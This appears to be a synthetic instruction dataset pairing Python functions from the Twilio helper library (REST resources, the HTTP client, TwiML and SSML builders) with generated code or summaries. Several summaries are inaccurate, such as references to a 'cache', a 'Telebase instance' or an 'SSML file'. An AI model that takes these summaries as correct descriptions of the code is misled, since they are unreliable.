{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct a ParticipantContext :param sid: A 34 character string that uniquely identifies this resource. :returns: twilio.rest.messaging.v1.session.participant.ParticipantContext :rtype: twilio.rest.messaging.v1.session.participant.ParticipantContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ParticipantContext\n\n        :param sid: A 34 character string that uniquely identifies this resource.\n\n        :returns: twilio.rest.messaging.v1.session.participant.ParticipantContext\n        :rtype: twilio.rest.messaging.v1.session.participant.ParticipantContext\n        \"\"\"\n        return ParticipantContext(self._version, session_sid=self._solution['session_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the ParticipantInstance with the specified attributes.", "response": "def update(self, attributes=values.unset, date_created=values.unset,\n               date_updated=values.unset):\n        \"\"\"\n        Update the ParticipantInstance\n\n        :param unicode attributes: An optional string metadata field you can use to store any data you wish.\n        :param datetime date_created: The date that this resource was created.\n        :param datetime date_updated: The date that this resource was last updated.\n\n        :returns: Updated ParticipantInstance\n        :rtype: twilio.rest.messaging.v1.session.participant.ParticipantInstance\n        \"\"\"\n        return self._proxy.update(\n            attributes=attributes,\n            date_created=date_created,\n            date_updated=date_updated,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef stream(self, device_sid=values.unset, limit=None, page_size=None):\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(device_sid=device_sid, page_size=limits['page_size'], )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams KeyInstance records from the API as a generator."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstreaming KeyInstance records from the API as a list.", "response": "def list(self, device_sid=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists KeyInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode device_sid: Find all Keys authenticating specified Device.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.deployed_devices.fleet.key.KeyInstance]\n        \"\"\"\n        return list(self.stream(device_sid=device_sid, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a KeyContext :param sid: A string that uniquely identifies the Key. :returns: twilio.rest.preview.deployed_devices.fleet.key.KeyContext :rtype: twilio.rest.preview.deployed_devices.fleet.key.KeyContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a KeyContext\n\n        :param sid: A string that uniquely identifies the Key.\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.key.KeyContext\n        :rtype: twilio.rest.preview.deployed_devices.fleet.key.KeyContext\n        \"\"\"\n        return KeyContext(self._version, fleet_sid=self._solution['fleet_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return KeyInstance(self._version, payload, fleet_sid=self._solution['fleet_sid'], )", "response": "Build an instance of KeyInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = KeyContext(\n                self._version,\n                fleet_sid=self._solution['fleet_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the key instance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the KeyInstance :param unicode friendly_name: The human readable description for this Key. :param unicode device_sid: The unique identifier of a Key to be authenticated. :returns: Updated KeyInstance :rtype: twilio.rest.preview.deployed_devices.fleet.key.KeyInstance", "response": "def update(self, friendly_name=values.unset, device_sid=values.unset):\n        \"\"\"\n        Update the KeyInstance\n\n        :param unicode friendly_name: The human readable description for this Key.\n        :param unicode device_sid: The unique identifier of a Key to be authenticated.\n\n        :returns: Updated KeyInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.key.KeyInstance\n        \"\"\"\n        return self._proxy.update(friendly_name=friendly_name, device_sid=device_sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef request(self, method, url, params=None, data=None, headers=None, auth=None, timeout=None,\n                allow_redirects=False):\n        \"\"\"\n        Make an HTTP Request with parameters provided.\n\n        :param str method: The HTTP method to use\n        :param str url: The URL to request\n        :param dict params: Query parameters to append to the URL\n        :param dict data: Parameters to go in the body of the HTTP request\n        :param dict headers: HTTP Headers to send with the request\n        :param tuple auth: Basic Auth arguments\n        :param float timeout: Socket/Read timeout for the request\n        :param boolean allow_redirects: Whether or not to allow redirects\n        See the requests documentation for explanation of all these parameters\n\n        :return: An http response\n        :rtype: A :class:`Response <twilio.rest.http.response.Response>` object\n        \"\"\"\n\n        kwargs = {\n            'method': method.upper(),\n            'url': url,\n            'params': params,\n            'data': data,\n            'headers': headers,\n            'auth': auth,\n            'hooks': self.request_hooks\n        }\n\n        if params:\n            _logger.info('{method} Request: {url}?{query}'.format(query=urlencode(params), **kwargs))\n            _logger.info('PARAMS: {params}'.format(**kwargs))\n        else:\n            _logger.info('{method} Request: {url}'.format(**kwargs))\n        if data:\n            _logger.info('PAYLOAD: {data}'.format(**kwargs))\n\n        self.last_response = None\n        session = self.session or Session()\n        request = Request(**kwargs)\n        self.last_request = TwilioRequest(**kwargs)\n\n        prepped_request = session.prepare_request(request)\n        response = session.send(\n            prepped_request,\n            allow_redirects=allow_redirects,\n            timeout=timeout,\n        )\n\n        _logger.info('{method} Response: {status} {text}'.format(method=method, status=response.status_code, text=response.text))\n\n        self.last_response = Response(int(response.status_code), response.text)\n\n        return self.last_response", "response": "Make an HTTP request with parameters provided."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, sid):\n        return InteractionContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            session_sid=self._solution['session_sid'],\n            sid=sid,\n        )", "response": "Constructs a InteractionContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.proxy.v1.service.session.interaction.InteractionContext\n        :rtype: twilio.rest.proxy.v1.service.session.interaction.InteractionContext"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return InteractionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            session_sid=self._solution['session_sid'],\n        )", "response": "Build an instance of InteractionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self, sid):\n        return OutgoingCallerIdContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a OutgoingCallerIdContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.outgoing_caller_id.OutgoingCallerIdContext\n        :rtype: twilio.rest.api.v2010.account.outgoing_caller_id.OutgoingCallerIdContext"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return OutgoingCallerIdInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of OutgoingCallerIdInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = OutgoingCallerIdContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new UserInstance", "response": "def create(self, identity, role_sid=values.unset, attributes=values.unset,\n               friendly_name=values.unset):\n        \"\"\"\n        Create a new UserInstance\n\n        :param unicode identity: The `identity` value that identifies the new resource's User\n        :param unicode role_sid: The SID of the Role assigned to this user\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param unicode friendly_name: A string to describe the new resource\n\n        :returns: Newly created UserInstance\n        :rtype: twilio.rest.chat.v2.service.user.UserInstance\n        \"\"\"\n        data = values.of({\n            'Identity': identity,\n            'RoleSid': role_sid,\n            'Attributes': attributes,\n            'FriendlyName': friendly_name,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return UserInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, sid):\n        return UserContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a UserContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.user.UserContext\n        :rtype: twilio.rest.chat.v2.service.user.UserContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return UserInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of UserInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, role_sid=values.unset, attributes=values.unset,\n               friendly_name=values.unset):\n        \"\"\"\n        Update the UserInstance\n\n        :param unicode role_sid: The SID id of the Role assigned to this user\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated UserInstance\n        :rtype: twilio.rest.chat.v2.service.user.UserInstance\n        \"\"\"\n        data = values.of({'RoleSid': role_sid, 'Attributes': attributes, 'FriendlyName': friendly_name, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return UserInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the UserInstance\n\n        :param unicode role_sid: The SID id of the Role assigned to this user\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated UserInstance\n        :rtype: twilio.rest.chat.v2.service.user.UserInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef user_channels(self):\n        if self._user_channels is None:\n            self._user_channels = UserChannelList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                user_sid=self._solution['sid'],\n            )\n        return self._user_channels", "response": "Access the user_channels\n\n        :returns: twilio.rest.chat.v2.service.user.user_channel.UserChannelList\n        :rtype: twilio.rest.chat.v2.service.user.user_channel.UserChannelList"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\naccesses the user_bindings :returns: twilio.rest.chat.v2.service.user.user_binding.UserBindingList :rtype: twilio.rest.chat.v2.service.user.user_binding.UserBindingList", "response": "def user_bindings(self):\n        \"\"\"\n        Access the user_bindings\n\n        :returns: twilio.rest.chat.v2.service.user.user_binding.UserBindingList\n        :rtype: twilio.rest.chat.v2.service.user.user_binding.UserBindingList\n        \"\"\"\n        if self._user_bindings is None:\n            self._user_bindings = UserBindingList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                user_sid=self._solution['sid'],\n            )\n        return self._user_bindings"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the user", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: UserContext for this UserInstance\n        :rtype: twilio.rest.chat.v2.service.user.UserContext\n        \"\"\"\n        if self._context is None:\n            self._context = UserContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, role_sid=values.unset, attributes=values.unset,\n               friendly_name=values.unset):\n        \"\"\"\n        Update the UserInstance\n\n        :param unicode role_sid: The SID id of the Role assigned to this user\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated UserInstance\n        :rtype: twilio.rest.chat.v2.service.user.UserInstance\n        \"\"\"\n        return self._proxy.update(role_sid=role_sid, attributes=attributes, friendly_name=friendly_name, )", "response": "Update the UserInstance\n\n        :param unicode role_sid: The SID id of the Role assigned to this user\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param unicode friendly_name: A string to describe the resource\n\n        :returns: Updated UserInstance\n        :rtype: twilio.rest.chat.v2.service.user.UserInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef connect(self, action=None, method=None, **kwargs):\n        return self.nest(Connect(action=action, method=method, **kwargs))", "response": "Create a Connect element and return it"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef dial(self, number=None, action=None, method=None, timeout=None,\n             hangup_on_star=None, time_limit=None, caller_id=None, record=None,\n             trim=None, recording_status_callback=None,\n             recording_status_callback_method=None,\n             recording_status_callback_event=None, answer_on_bridge=None,\n             ring_tone=None, **kwargs):\n        \"\"\"\n        Create a <Dial> element\n\n        :param number: Phone number to dial\n        :param action: Action URL\n        :param method: Action URL method\n        :param timeout: Time to wait for answer\n        :param hangup_on_star: Hangup call on star press\n        :param time_limit: Max time length\n        :param caller_id: Caller ID to display\n        :param record: Record the call\n        :param trim: Trim the recording\n        :param recording_status_callback: Recording status callback URL\n        :param recording_status_callback_method: Recording status callback URL method\n        :param recording_status_callback_event: Recording status callback events\n        :param answer_on_bridge: Preserve the ringing behavior of the inbound call until the Dialed call picks up\n        :param ring_tone: Ringtone allows you to override the ringback tone that Twilio will play back to the caller while executing the Dial\n        :param kwargs: additional attributes\n\n        :returns: <Dial> element\n        \"\"\"\n        return self.nest(Dial(\n            number=number,\n            action=action,\n            method=method,\n            timeout=timeout,\n            hangup_on_star=hangup_on_star,\n            time_limit=time_limit,\n            caller_id=caller_id,\n            record=record,\n            trim=trim,\n            recording_status_callback=recording_status_callback,\n            recording_status_callback_method=recording_status_callback_method,\n            recording_status_callback_event=recording_status_callback_event,\n            answer_on_bridge=answer_on_bridge,\n            ring_tone=ring_tone,\n            **kwargs\n        ))", "response": "Creates a new dial element and returns it"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef enqueue(self, name=None, action=None, method=None, wait_url=None,\n                wait_url_method=None, workflow_sid=None, **kwargs):\n        \"\"\"\n        Create a <Enqueue> element\n\n        :param name: Friendly name\n        :param action: Action URL\n        :param method: Action URL method\n        :param wait_url: Wait URL\n        :param wait_url_method: Wait URL method\n        :param workflow_sid: TaskRouter Workflow SID\n        :param kwargs: additional attributes\n\n        :returns: <Enqueue> element\n        \"\"\"\n        return self.nest(Enqueue(\n            name=name,\n            action=action,\n            method=method,\n            wait_url=wait_url,\n            wait_url_method=wait_url_method,\n            workflow_sid=workflow_sid,\n            **kwargs\n        ))", "response": "Create a new Enqueue element."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef gather(self, input=None, action=None, method=None, timeout=None,\n               speech_timeout=None, max_speech_time=None, profanity_filter=None,\n               finish_on_key=None, num_digits=None, partial_result_callback=None,\n               partial_result_callback_method=None, language=None, hints=None,\n               barge_in=None, debug=None, action_on_empty_result=None, **kwargs):\n        \"\"\"\n        Create a <Gather> element\n\n        :param input: Input type Twilio should accept\n        :param action: Action URL\n        :param method: Action URL method\n        :param timeout: Time to wait to gather input\n        :param speech_timeout: Time to wait to gather speech input and it should be either auto or a positive integer.\n        :param max_speech_time: Max allowed time for speech input\n        :param profanity_filter: Profanity Filter on speech\n        :param finish_on_key: Finish gather on key\n        :param num_digits: Number of digits to collect\n        :param partial_result_callback: Partial result callback URL\n        :param partial_result_callback_method: Partial result callback URL method\n        :param language: Language to use\n        :param hints: Speech recognition hints\n        :param barge_in: Stop playing media upon speech\n        :param debug: Allow debug for gather\n        :param action_on_empty_result: Force webhook to the action URL event if there is no input\n        :param kwargs: additional attributes\n\n        :returns: <Gather> element\n        \"\"\"\n        return self.nest(Gather(\n            input=input,\n            action=action,\n            method=method,\n            timeout=timeout,\n            speech_timeout=speech_timeout,\n            max_speech_time=max_speech_time,\n            profanity_filter=profanity_filter,\n            finish_on_key=finish_on_key,\n            num_digits=num_digits,\n            partial_result_callback=partial_result_callback,\n            partial_result_callback_method=partial_result_callback_method,\n            language=language,\n            hints=hints,\n            barge_in=barge_in,\n            debug=debug,\n            action_on_empty_result=action_on_empty_result,\n            **kwargs\n        ))", "response": "Create a Gather element."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a pause element and return it", "response": "def pause(self, length=None, **kwargs):\n        \"\"\"\n        Create a <Pause> element\n\n        :param length: Length in seconds to pause\n        :param kwargs: additional attributes\n\n        :returns: <Pause> element\n        \"\"\"\n        return self.nest(Pause(length=length, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef play(self, url=None, loop=None, digits=None, **kwargs):\n        return self.nest(Play(url=url, loop=loop, digits=digits, **kwargs))", "response": "Create a new Play element with the given url and loop and digits."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef queue(self, name, url=None, method=None, reservation_sid=None,\n              post_work_activity_sid=None, **kwargs):\n        \"\"\"\n        Create a <Queue> element\n\n        :param name: Queue name\n        :param url: Action URL\n        :param method: Action URL method\n        :param reservation_sid: TaskRouter Reservation SID\n        :param post_work_activity_sid: TaskRouter Activity SID\n        :param kwargs: additional attributes\n\n        :returns: <Queue> element\n        \"\"\"\n        return self.nest(Queue(\n            name,\n            url=url,\n            method=method,\n            reservation_sid=reservation_sid,\n            post_work_activity_sid=post_work_activity_sid,\n            **kwargs\n        ))", "response": "Create a new Queue element with optional parameters."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef record(self, action=None, method=None, timeout=None, finish_on_key=None,\n               max_length=None, play_beep=None, trim=None,\n               recording_status_callback=None,\n               recording_status_callback_method=None,\n               recording_status_callback_event=None, transcribe=None,\n               transcribe_callback=None, **kwargs):\n        \"\"\"\n        Create a <Record> element\n\n        :param action: Action URL\n        :param method: Action URL method\n        :param timeout: Timeout to begin recording\n        :param finish_on_key: Finish recording on key\n        :param max_length: Max time to record in seconds\n        :param play_beep: Play beep\n        :param trim: Trim the recording\n        :param recording_status_callback: Status callback URL\n        :param recording_status_callback_method: Status callback URL method\n        :param recording_status_callback_event: Recording status callback events\n        :param transcribe: Transcribe the recording\n        :param transcribe_callback: Transcribe callback URL\n        :param kwargs: additional attributes\n\n        :returns: <Record> element\n        \"\"\"\n        return self.nest(Record(\n            action=action,\n            method=method,\n            timeout=timeout,\n            finish_on_key=finish_on_key,\n            max_length=max_length,\n            play_beep=play_beep,\n            trim=trim,\n            recording_status_callback=recording_status_callback,\n            recording_status_callback_method=recording_status_callback_method,\n            recording_status_callback_event=recording_status_callback_event,\n            transcribe=transcribe,\n            transcribe_callback=transcribe_callback,\n            **kwargs\n        ))", "response": "Create a new record element."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef redirect(self, url, method=None, **kwargs):\n        return self.nest(Redirect(url, method=method, **kwargs))", "response": "Create a Redirect element and return it"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef reject(self, reason=None, **kwargs):\n        return self.nest(Reject(reason=reason, **kwargs))", "response": "Create a new reject element and return it"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef say(self, message=None, voice=None, loop=None, language=None, **kwargs):\n        return self.nest(Say(message=message, voice=voice, loop=loop, language=language, **kwargs))", "response": "Create a Say element and add it to the cache"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new SMS element with the specified attributes.", "response": "def sms(self, message, to=None, from_=None, action=None, method=None,\n            status_callback=None, **kwargs):\n        \"\"\"\n        Create a <Sms> element\n\n        :param message: Message body\n        :param to: Number to send message to\n        :param from: Number to send message from\n        :param action: Action URL\n        :param method: Action URL method\n        :param status_callback: Status callback URL\n        :param kwargs: additional attributes\n\n        :returns: <Sms> element\n        \"\"\"\n        return self.nest(Sms(\n            message,\n            to=to,\n            from_=from_,\n            action=action,\n            method=method,\n            status_callback=status_callback,\n            **kwargs\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef pay(self, input=None, action=None, status_callback=None,\n            status_callback_method=None, timeout=None, max_attempts=None,\n            security_code=None, postal_code=None, payment_connector=None,\n            token_type=None, charge_amount=None, currency=None, description=None,\n            valid_card_types=None, language=None, **kwargs):\n        \"\"\"\n        Create a <Pay> element\n\n        :param input: Input type Twilio should accept\n        :param action: Action URL\n        :param status_callback: Status callback URL\n        :param status_callback_method: Status callback method\n        :param timeout: Time to wait to gather input\n        :param max_attempts: Maximum number of allowed retries when gathering input\n        :param security_code: Prompt for security code\n        :param postal_code: Prompt for postal code and it should be true/false or default postal code\n        :param payment_connector: Unique name for payment connector\n        :param token_type: Type of token\n        :param charge_amount: Amount to process. If value is greater than 0 then make the payment else create a payment token\n        :param currency: Currency of the amount attribute\n        :param description: Details regarding the payment\n        :param valid_card_types: Comma separated accepted card types\n        :param language: Language to use\n        :param kwargs: additional attributes\n\n        :returns: <Pay> element\n        \"\"\"\n        return self.nest(Pay(\n            input=input,\n            action=action,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            timeout=timeout,\n            max_attempts=max_attempts,\n            security_code=security_code,\n            postal_code=postal_code,\n            payment_connector=payment_connector,\n            token_type=token_type,\n            charge_amount=charge_amount,\n            currency=currency,\n            description=description,\n            valid_card_types=valid_card_types,\n            language=language,\n            **kwargs\n        ))", "response": "Creates a new Pay element and returns it"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new prompt element", "response": "def prompt(self, for_=None, error_type=None, card_type=None, attempt=None,\n               **kwargs):\n        \"\"\"\n        Create a <Prompt> element\n\n        :param for_: Name of the credit card data element\n        :param error_type: Type of error\n        :param card_type: Type of the credit card\n        :param attempt: Current attempt count\n        :param kwargs: additional attributes\n\n        :returns: <Prompt> element\n        \"\"\"\n        return self.nest(Prompt(\n            for_=for_,\n            error_type=error_type,\n            card_type=card_type,\n            attempt=attempt,\n            **kwargs\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef ssml_break(self, strength=None, time=None, **kwargs):\n        return self.nest(SsmlBreak(strength=strength, time=time, **kwargs))", "response": "Create a new SsmlBreak element and return it"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ssml_emphasis(self, words, level=None, **kwargs):\n        return self.nest(SsmlEmphasis(words, level=level, **kwargs))", "response": "Create a new element containing the emphasized words."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new element with the specified words and optional XML language.", "response": "def ssml_lang(self, words, xml_lang=None, **kwargs):\n        \"\"\"\n        Create a <Lang> element\n\n        :param words: Words to speak\n        :param xml:lang: Specify the language\n        :param kwargs: additional attributes\n\n        :returns: <Lang> element\n        \"\"\"\n        return self.nest(SsmlLang(words, xml_lang=xml_lang, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new element with a phoneme.", "response": "def ssml_phoneme(self, words, alphabet=None, ph=None, **kwargs):\n        \"\"\"\n        Create a <Phoneme> element\n\n        :param words: Words to speak\n        :param alphabet: Specify the phonetic alphabet\n        :param ph: Specifiy the phonetic symbols for pronunciation\n        :param kwargs: additional attributes\n\n        :returns: <Phoneme> element\n        \"\"\"\n        return self.nest(SsmlPhoneme(words, alphabet=alphabet, ph=ph, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ssml_prosody(self, words, volume=None, rate=None, pitch=None, **kwargs):\n        return self.nest(SsmlProsody(words, volume=volume, rate=rate, pitch=pitch, **kwargs))", "response": "Create a new element with the specified words and optionally a volume rate and pitch."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new SsmlSayAs element and add it to the end of the SSML file.", "response": "def ssml_say_as(self, words, interpret_as=None, role=None, **kwargs):\n        \"\"\"\n        Create a <Say-As> element\n\n        :param words: Words to be interpreted\n        :param interpret-as: Specify the type of words are spoken\n        :param role: Specify the format of the date when interpret-as is set to date\n        :param kwargs: additional attributes\n\n        :returns: <Say-As> element\n        \"\"\"\n        return self.nest(SsmlSayAs(words, interpret_as=interpret_as, role=role, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a Sub element from a list of words.", "response": "def ssml_sub(self, words, alias=None, **kwargs):\n        \"\"\"\n        Create a <Sub> element\n\n        :param words: Words to be substituted\n        :param alias: Substitute a different word (or pronunciation) for selected text such as an acronym or abbreviation\n        :param kwargs: additional attributes\n\n        :returns: <Sub> element\n        \"\"\"\n        return self.nest(SsmlSub(words, alias=alias, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new element with a pronunciation of words.", "response": "def ssml_w(self, words, role=None, **kwargs):\n        \"\"\"\n        Create a <W> element\n\n        :param words: Words to speak\n        :param role: Customize the pronunciation of words by specifying the word\u2019s part of speech or alternate meaning\n        :param kwargs: additional attributes\n\n        :returns: <W> element\n        \"\"\"\n        return self.nest(SsmlW(words, role=role, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef task(self, body, priority=None, timeout=None, **kwargs):\n        return self.nest(Task(body, priority=priority, timeout=timeout, **kwargs))", "response": "Create a Task element"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new Client element with optional parameters.", "response": "def client(self, identity=None, url=None, method=None,\n               status_callback_event=None, status_callback=None,\n               status_callback_method=None, **kwargs):\n        \"\"\"\n        Create a <Client> element\n\n        :param identity: Client identity\n        :param url: Client URL\n        :param method: Client URL Method\n        :param status_callback_event: Events to trigger status callback\n        :param status_callback: Status Callback URL\n        :param status_callback_method: Status Callback URL Method\n        :param kwargs: additional attributes\n\n        :returns: <Client> element\n        \"\"\"\n        return self.nest(Client(\n            identity=identity,\n            url=url,\n            method=method,\n            status_callback_event=status_callback_event,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            **kwargs\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef conference(self, name, muted=None, beep=None,\n                   start_conference_on_enter=None, end_conference_on_exit=None,\n                   wait_url=None, wait_method=None, max_participants=None,\n                   record=None, region=None, whisper=None, trim=None,\n                   status_callback_event=None, status_callback=None,\n                   status_callback_method=None, recording_status_callback=None,\n                   recording_status_callback_method=None,\n                   recording_status_callback_event=None, event_callback_url=None,\n                   **kwargs):\n        \"\"\"\n        Create a <Conference> element\n\n        :param name: Conference name\n        :param muted: Join the conference muted\n        :param beep: Play beep when joining\n        :param start_conference_on_enter: Start the conference on enter\n        :param end_conference_on_exit: End the conferenceon exit\n        :param wait_url: Wait URL\n        :param wait_method: Wait URL method\n        :param max_participants: Maximum number of participants\n        :param record: Record the conference\n        :param region: Conference region\n        :param whisper: Call whisper\n        :param trim: Trim the conference recording\n        :param status_callback_event: Events to call status callback URL\n        :param status_callback: Status callback URL\n        :param status_callback_method: Status callback URL method\n        :param recording_status_callback: Recording status callback URL\n        :param recording_status_callback_method: Recording status callback URL method\n        :param recording_status_callback_event: Recording status callback events\n        :param event_callback_url: Event callback URL\n        :param kwargs: additional attributes\n\n        :returns: <Conference> element\n        \"\"\"\n        return self.nest(Conference(\n            name,\n            muted=muted,\n            beep=beep,\n            start_conference_on_enter=start_conference_on_enter,\n            end_conference_on_exit=end_conference_on_exit,\n            wait_url=wait_url,\n            wait_method=wait_method,\n            max_participants=max_participants,\n            record=record,\n            region=region,\n            whisper=whisper,\n            trim=trim,\n            status_callback_event=status_callback_event,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            recording_status_callback=recording_status_callback,\n            recording_status_callback_method=recording_status_callback_method,\n            recording_status_callback_event=recording_status_callback_event,\n            event_callback_url=event_callback_url,\n            **kwargs\n        ))", "response": "Create a conference element"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a Number element in the current Telebase instance", "response": "def number(self, phone_number, send_digits=None, url=None, method=None,\n               status_callback_event=None, status_callback=None,\n               status_callback_method=None, **kwargs):\n        \"\"\"\n        Create a <Number> element\n\n        :param phone_number: Phone Number to dial\n        :param send_digits: DTMF tones to play when the call is answered\n        :param url: TwiML URL\n        :param method: TwiML URL method\n        :param status_callback_event: Events to call status callback\n        :param status_callback: Status callback URL\n        :param status_callback_method: Status callback URL method\n        :param kwargs: additional attributes\n\n        :returns: <Number> element\n        \"\"\"\n        return self.nest(Number(\n            phone_number,\n            send_digits=send_digits,\n            url=url,\n            method=method,\n            status_callback_event=status_callback_event,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n            **kwargs\n        ))"}
